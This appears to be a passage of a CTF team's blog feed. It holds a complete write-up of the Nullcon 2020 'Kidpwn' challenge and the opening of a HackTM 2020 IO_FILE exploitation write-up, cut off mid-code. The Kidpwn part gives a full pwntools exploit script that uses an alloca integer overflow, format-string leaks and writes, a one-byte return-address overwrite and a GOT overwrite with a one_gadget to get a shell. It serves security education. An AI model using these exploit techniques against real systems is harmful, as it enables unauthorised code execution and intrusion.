      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
    
      <category term="nullcon2020" scheme="https://teamrocketist.github.io/tags/nullcon2020/"/>
    
      <category term="unlink" scheme="https://teamrocketist.github.io/tags/unlink/"/>
    
      <category term="offbyone" scheme="https://teamrocketist.github.io/tags/offbyone/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Nullcon 2020 - Kidpwn</title>
    <link href="https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-Kidpwn/"/>
    <id>https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-Kidpwn/</id>
    <published>2020-02-09T10:28:39.000Z</published>
    <updated>2020-02-10T16:42:57.835Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>437 Points   </p><p>nc pwn2.ctf.nullcon.net 5003</p><p><a href="https://mega.nz/#!mqYEhSBb!gl9DC7pgcI0dF7-n2yR667i4ve7VcI3RBox06-Shrhw" target="_blank" rel="noopener">challenge</a></p><p>f115365f85409565c4bdf94690434aae</p><p><a href="https://mega.nz/#!6jRgRA6C!C67-WeX3J5Z174wxwnQ8llhYjSnjL5N6lPTUFCVMYh8" target="_blank" rel="noopener">libc-2.23.so</a></p><p>8c0d248ea33e6ef17b759fa5d81dda9e</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak <strong>libc</strong> and <strong>pie</strong> addresses with format string</li><li>Overflow the <strong>last byte</strong> of ret addr and jump to another position in <strong>_libc_main</strong> to return to main</li><li>Change <strong>exit got</strong> with <strong>one gadget</strong> using format string</li></ul><h3 id="Binary-security-and-architecture"><a href="#Binary-security-and-architecture" class="headerlink" title="Binary security and architecture"></a>Binary security and architecture</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec challenge</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/kidpwn/challenge'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>No canary protection</strong> in this executable, relro is partial meaning we can <strong>overwrite</strong> the global offset table also we have another issue <strong>PIE</strong> is enabled. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file challenge</span><br><span class="line">challenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=286d2ceaa8091a1b44bb0dcaf214d76c1d40bfee, stripped</span><br></pre></td></tr></table></figure><p>Libc is a shared library (dynamically linked) and the architecture is x86-64.</p><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><p>Analysing the <strong>main</strong> we know we have a very simple program, it reads an integer from the input and creates a buffer in the stack using <strong>alloca</strong>, then it reads input from the stdin and stores it in this new created buffer then it prints it using <strong>printf</strong>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v7; <span class="comment">// [rsp+6Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( unk_20105C )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">200</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    v7 = atoi(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = alloca(<span class="number">16</span> * (((__int16)v7 + <span class="number">30L</span>L) / <span class="number">0x10</span>uLL));</span><br><span class="line">  qword_201060 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  read(<span class="number">0</span>, (<span class="keyword">void</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>)), v7);</span><br><span class="line">  <span class="built_in">printf</span>(qword_201060);</span><br><span class="line">  <span class="keyword">if</span> ( unk_20105C )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0L</span>L);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"JK, you lose!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++unk_20105C;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>We can achieve a <strong>buffer overflow</strong> by causing an <strong>integer overflow</strong> in the operations inside <strong>alloca</strong>, by sending a <strong>negative number</strong>  will cause <strong>alloca</strong> to create a smaller buffer in the stack than the inputted string:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v7 = atoi(&amp;s); <span class="comment">// Negative values</span></span><br><span class="line">&#125;</span><br><span class="line">v4 = alloca(<span class="number">16</span> * (((__int16)v7 + <span class="number">30L</span>L) / <span class="number">0x10</span>uLL)); <span class="comment">// integer overflow in this operations causing a smaller buffer then the input that will come next</span></span><br><span class="line">qword_201060 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>)), v7); <span class="comment">// input will be bigger than the buffer</span></span><br></pre></td></tr></table></figure></p><p>We can leak and get arbirtrary write by using a format string vulnerability in <strong>printf</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(qword_201060); <span class="comment">// format string vulnerability</span></span><br></pre></td></tr></table></figure><h3 id="Plan"><a href="#Plan" class="headerlink" title="Plan"></a>Plan</h3><ul><li>Leak libc and pie addresses</li><li>Find a way to return to main</li><li>Overwrite exit got address</li></ul><h3 id="Find-a-way-to-return-to-main"><a href="#Find-a-way-to-return-to-main" class="headerlink" title="Find a way to return to main"></a>Find a way to return to main</h3><p>The most difficulty part of the challenge was to find a way to return to main, the pie is enabled so we can’t overwrite the <strong>global offset table</strong> or a <strong>global variable</strong> without leaking the PIE base address first.</p><p>My solution resolved on overflowing the last byte of the return address, in the <strong>c</strong> language after returning from the <strong>main</strong> function our program will jump into a location in <strong>__libc_start_main</strong> and execute <strong>exit</strong> with the value returned by the main function. If we modify the last byte we can prevent the execution of <strong>exit</strong> and rerun the code that the program used to call main in the beginning.</p><p>If you are used to using gdb you should have already noticed after the entry point there is a moment at _libc_start_main when you reach assembly instruction <code>call rax</code> the rax register contains a pointer to the begining of main.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/dv2ydQq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dv2ydQq.png" alt><br></a></p><p>We just need to find the right place to jump in <strong>_libc_start_main</strong> and since <strong>ASLR</strong> doesn’t affect the last 3 numbers of a libc address it’s completely fine to only overflow the last byte, after some debugging I found a byte that will work for this libc version (2.23) <strong>0xa8</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>) <span class="comment"># overwrite last byte of return address to jump to another _libc_main loc</span></span><br></pre></td></tr></table></figure><h3 id="Leaking-pie-and-libc"><a href="#Leaking-pie-and-libc" class="headerlink" title="Leaking pie and libc"></a>Leaking pie and libc</h3><p>This can be done with the format string vulnerability itself, the libc address will show up after we overflow the buffer, we also need to leak <strong>PIE</strong> because we need the offsets to the <strong>global offset table</strong> we can find a pie address at the 27th position of the stack:</p><p>“%lx” because we want to leak a 64 bit pointer:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>)</span><br></pre></td></tr></table></figure></p><p>Then is just a matter of calculating the offsets(0x208a8,0x880) by using gdb:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">output = r.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line">LIBC = u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x208a8</span> <span class="comment"># libc leak</span></span><br><span class="line">PIE = int(output[:<span class="number">14</span>],<span class="number">16</span>)<span class="number">-0x880</span> <span class="comment"># geting pie</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"PIE 0x%x"</span>%PIE)</span><br><span class="line"></span><br><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br></pre></td></tr></table></figure></p><h3 id="Overwriting-exit-got-address"><a href="#Overwriting-exit-got-address" class="headerlink" title="Overwriting exit got address"></a>Overwriting exit got address</h3><p>I spent a lot of time here unnecessarily, to modify the address of exit_got we just need to modify last 1/2 bytes, instead I just modified everything spending a lot of time, while this is a good exercise is not very funny spending a lot of time figuring out a way to write a complete <strong>libc</strong> address during a competition, my solution resolved around sorting the HIGH,LOW addresses and do 3 writes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the reason why you should learn about format string libraries and saves you a lot of time </span></span><br><span class="line">WIN_LOW_0 = ONE_GADGET &amp; <span class="number">0xffff</span></span><br><span class="line">WIN_LOW_1 = (ONE_GADGET &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">WIN_HIGH = ONE_GADGET &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">addresses = [(WIN_LOW_0,<span class="number">1</span>), (WIN_LOW_1,<span class="number">2</span>), (WIN_HIGH,<span class="number">3</span>)]</span><br><span class="line">addresses.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"ONE_GADGET 0x%x"</span> % ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_0 0x%x"</span> % WIN_LOW_0)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_1 0x%x"</span> % WIN_LOW_1)</span><br><span class="line">log.info(<span class="string">"WIN_HIGH 0x%x"</span> % WIN_HIGH)</span><br><span class="line">log.info(<span class="string">"GOT EXIT 0x%x"</span> % (PIE+elf.got[<span class="string">'_exit'</span>]))</span><br><span class="line"></span><br><span class="line">getstr = &#123;<span class="number">1</span>:<span class="string">'%&#123;&#125;x%13$hn'</span>, <span class="number">2</span>:<span class="string">'%&#123;&#125;x%14$hn'</span>, <span class="number">3</span>:<span class="string">'%&#123;&#125;x%15$hn'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += <span class="string">'%13$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += getstr[addresses[<span class="number">0</span>][<span class="number">1</span>]].format(addresses[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line">s += getstr[addresses[<span class="number">1</span>][<span class="number">1</span>]].format(addresses[<span class="number">1</span>][<span class="number">0</span>]-addresses[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">s += getstr[addresses[<span class="number">2</span>][<span class="number">1</span>]].format(addresses[<span class="number">2</span>][<span class="number">0</span>]-addresses[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">56</span>-len(s))</span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>])<span class="comment">#'B'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">2</span>)<span class="comment">#'A'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">4</span>)<span class="comment">#'C'*8</span></span><br><span class="line">s += <span class="string">"\n"</span></span><br><span class="line">r.send(s)</span><br></pre></td></tr></table></figure><p>Also a format string library could also be used but I’m very lazy in starting learning how to use one.</p><p>The full exploit code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn2.ctf.nullcon.net"</span>, <span class="string">"5003"</span></span><br><span class="line">filename = <span class="string">"./challenge"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x9D8</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'-1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>) <span class="comment"># overwrite last byte of return address to jump to another _libc_main loc</span></span><br><span class="line">output = r.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line">LIBC = u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x208a8</span> <span class="comment"># libc leak</span></span><br><span class="line">PIE = int(output[:<span class="number">14</span>],<span class="number">16</span>)<span class="number">-0x880</span> <span class="comment"># geting pie</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"PIE 0x%x"</span>%PIE)</span><br><span class="line"></span><br><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the reason why you should learn about format string libraries saves you a lot of time </span></span><br><span class="line">WIN_LOW_0 = ONE_GADGET &amp; <span class="number">0xffff</span></span><br><span class="line">WIN_LOW_1 = (ONE_GADGET &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">WIN_HIGH = ONE_GADGET &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">addresses = [(WIN_LOW_0,<span class="number">1</span>), (WIN_LOW_1,<span class="number">2</span>), (WIN_HIGH,<span class="number">3</span>)]</span><br><span class="line">addresses.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"ONE_GADGET 0x%x"</span> % ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_0 0x%x"</span> % WIN_LOW_0)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_1 0x%x"</span> % WIN_LOW_1)</span><br><span class="line">log.info(<span class="string">"WIN_HIGH 0x%x"</span> % WIN_HIGH)</span><br><span class="line">log.info(<span class="string">"GOT EXIT 0x%x"</span> % (PIE+elf.got[<span class="string">'_exit'</span>]))</span><br><span class="line"></span><br><span class="line">getstr = &#123;<span class="number">1</span>:<span class="string">'%&#123;&#125;x%13$hn'</span>, <span class="number">2</span>:<span class="string">'%&#123;&#125;x%14$hn'</span>, <span class="number">3</span>:<span class="string">'%&#123;&#125;x%15$hn'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += <span class="string">'%13$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += getstr[addresses[<span class="number">0</span>][<span class="number">1</span>]].format(addresses[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line">s += getstr[addresses[<span class="number">1</span>][<span class="number">1</span>]].format(addresses[<span class="number">1</span>][<span class="number">0</span>]-addresses[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">s += getstr[addresses[<span class="number">2</span>][<span class="number">1</span>]].format(addresses[<span class="number">2</span>][<span class="number">0</span>]-addresses[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">56</span>-len(s))</span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>])<span class="comment">#'B'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">2</span>)<span class="comment">#'A'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">4</span>)<span class="comment">#'C'*8</span></span><br><span class="line">s += <span class="string">"\n"</span></span><br><span class="line">r.send(s)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;437 Points   &lt;/p&gt;
&lt;p&gt;nc pwn2.ctf.nullcon.net 5003&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mega.nz/#!mqYEhSB
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="nullcon2020" scheme="https://teamrocketist.github.io/tags/nullcon2020/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] HackTM 2020 - Trip To Trick</title>
    <link href="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/"/>
    <id>https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/</id>
    <published>2020-02-05T15:46:42.000Z</published>
    <updated>2020-02-09T10:32:20.197Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Trip To Trick   </p></blockquote><blockquote><p><strong>Description</strong>:<br>492 Points   </p><p><strong>Author</strong>:<br>NextLine<br>Flag Path: /home/pwn/flag</p><p>nc 138.68.67.161 20006</p><p><a href="https://mega.nz/#!C340maAY!5TKiIDX7UWNMCcaFng2VoIqfZtJs-eGmc_Z5BYZR82I" target="_blank" rel="noopener">trip_to_trick</a></p><p>c6fd4ef7c34c528668edd62914a79602</p><p><a href="https://mega.nz/#!rzhykASR!m3uFt0cGx8jvNZjJ8O2dtZch-XKv-P-zo-vDd41rNwY" target="_blank" rel="noopener">libc.so.6</a></p><p>2fb0d6800d4d79ffdc7a388d7fe6aea0</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Set <code>_IO_2_1_stdin_-&gt;file-&gt;_IO_BUF_END = STDIN+0x2000</code></li><li>Next scanf will have <strong>full</strong> control of IO_FILE structures</li><li><code>STDOUT-&gt;vtable = _IO_helper_jumps</code> &amp; <code>STDOUT-&gt;flags=0x0</code> to bypass <strong>vtable checker</strong> and <strong>mprotect</strong> of <code>_IO_file_jumps</code></li><li>In <strong>libc-2.29</strong> vtables are writeable <strong>again</strong> so we can control rip by changing the value of <code>_IO_helper_jumps-&gt;__finish</code>  </li><li>Set <code>_IO_helper_jumps-&gt;__finish=setcontext+0x35</code> to obtain <strong>stack pivot</strong>.</li><li>Construct a <strong>ropchain</strong> to open/read/print the file</li></ul><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I didn’t solve this challenge during ctf time, but I spent a lot of time trying to do it, perhaps in the end I had the opportunity to speak with a guy who solved named <strong>stan</strong> from discord which told me his solution. </p><p>I eventually ended up implementing it, I learned a lot of new things about the <strong>IO_FILE struct</strong>, huge thanks to him for leading me into the right path in this challenge.</p><h3 id="Information-extraction"><a href="#Information-extraction" class="headerlink" title="Information extraction"></a>Information extraction</h3><p>File<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file trip_to_trick</span><br><span class="line">trip_to_trick: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9ba40c68c917a91e11558eceaffd3e006531a6d9, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></p><p>Security<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec trip_to_trick</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><h4 id="Main-function"><a href="#Main-function" class="headerlink" title="Main function"></a>Main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v4; <span 